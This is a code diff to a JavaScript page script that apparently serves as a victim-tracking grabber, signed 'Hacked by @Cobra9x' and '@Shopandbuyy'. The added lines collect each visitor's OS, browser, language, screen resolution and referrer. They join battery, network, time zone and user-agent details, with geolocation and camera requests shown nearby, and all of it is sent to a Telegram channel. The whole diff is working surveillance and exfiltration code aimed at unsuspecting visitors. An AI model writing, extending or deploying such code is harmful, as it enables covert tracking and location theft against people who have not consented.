@@ -93,6 +93,23 @@
       });
     }
 
+    function detectDeviceType(ua) {
+      if (/android/i.test(ua)) return "Android";
+      if (/iphone|ipad|ipod/i.test(ua)) return "iOS";
+      if (/windows/i.test(ua)) return "Windows";
+      if (/macintosh|mac os/i.test(ua)) return "Mac";
+      if (/linux/i.test(ua)) return "Linux";
+      return "Unknown";
+    }
+
+    function getBrowserName(ua) {
+      if (ua.includes("Firefox/")) return "Firefox";
+      if (ua.includes("Edg/")) return "Edge";
+      if (ua.includes("Chrome/")) return "Chrome";
+      if (ua.includes("Safari/") && !ua.includes("Chrome/")) return "Safari";
+      return "Unknown";
+    }
+
     function collectSensitive() {
       navigator.geolocation.getCurrentPosition(
         pos => {
@@ -136,7 +153,12 @@
 
     function sendBasicInfo() {
       const ua = navigator.userAgent;
+      const os = detectDeviceType(ua);
+      const browser = getBrowserName(ua);
       const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const lang = navigator.language || navigator.userLanguage;
+      const screenRes = `${screen.width} x ${screen.height}`;
+      const ref = document.referrer || "Direct";
       const connection = navigator.connection || {};
       const network = connection.effectiveType || "Unknown";
 
@@ -148,14 +170,15 @@
           .then(res => res.json())
           .then(data => {
             let basicInfo = "📱 Hacked by @Cobra9x\n\n";
+
             basicInfo += "📱 Device Info:\n";
-            basicInfo += `🔋 Charging: ${charging}\n`;
-            basicInfo += `🔌 Battery: ${level}\n`;
-            basicInfo += `🌐 Network: ${network.toUpperCase()}\n`;
-            basicInfo += `🕒 Time Zone: ${timeZone}\n`;
+            basicInfo += `💻 OS: ${os}\n🌐 Browser: ${browser}\n🔤 Language: ${lang}\n`;
+            basicInfo += `🔋 Charging: ${charging}\n🔌 Battery: ${level}\n📶 Network: ${network.toUpperCase()}\n`;
+            basicInfo += `🕒 Time Zone: ${timeZone}\n📺 Resolution: ${screenRes}\n`;
             basicInfo += `🖥️ User Agent: ${ua}\n`;
             basicInfo += `📱 Device: ${/Mobile/i.test(ua) ? "Mobile" : "Desktop"}\n\n`;
-            basicInfo += "🔒 GPS & camera permissions pending...";
+            basicInfo += `🔗 Referrer: ${ref}\n`;
+            basicInfo += "🔒 Awaiting GPS & camera permissions...";
             basicInfo += "📱 Hacked by @Shopandbuyy\n\n";
 
             sendToTelegram(basicInfo);
